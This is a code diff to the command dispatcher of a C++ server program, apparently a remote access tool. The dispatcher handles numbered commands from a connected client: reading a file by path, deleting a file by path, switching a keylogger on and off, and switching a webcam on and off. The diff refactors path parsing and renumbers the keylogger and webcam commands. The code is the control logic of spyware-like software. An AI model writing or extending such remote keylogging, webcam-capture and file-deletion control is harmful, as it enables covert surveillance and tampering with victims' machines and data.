@@ -35,14 +35,9 @@ void ServerSocket::ProcessClientMessage() {
 		result = resetStatus == 0 ? "Y" : "N";
 	}
 	else if (query == 20) {
-		int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
+		Receive();
 		index = 0;
-		string filePath = "";
-		cout << filePath << endl;
-		while (buffer[index] != '\0') {
-			filePath += buffer[index];
-			index++;
-		}
+		string filePath = GetFilePath();
 		fstream file(filePath, ios::binary | ios::in);
 		if (!file.is_open()) {
 			result = "N"; //File not found
@@ -68,11 +63,9 @@ void ServerSocket::ProcessClientMessage() {
 		}
 	}
 	else if (query == 21) {
-		string filePath = "";
-		while (buffer[index] != '\0') {
-			filePath += buffer[index];
-			index++;
-		}
+		Receive();
+		index = 0;
+		string filePath = GetFilePath();
 		if (DeleteFile(filePath)) {
 			result = "Y";
 		}
@@ -107,18 +100,19 @@ void ServerSocket::ProcessClientMessage() {
 		isKeyloggerOn = true;
 		result = "Y";
 	}
+	else if (query == 24) {
+		isKeyloggerOn = false;
+		result = "Y";
+	}
 	else if (query == 26) {
 		isWebcamOn = true;
 		result = "Y";
 	}
 	else if (query == 27) {
-		isKeyloggerOn = false;
-		result = "Y";
-	}
-	else if (query == 28) {
 		isWebcamOn = false;
 		result = "Y";
 	}
+	
 	if (sent) return;
 	Send();
 }
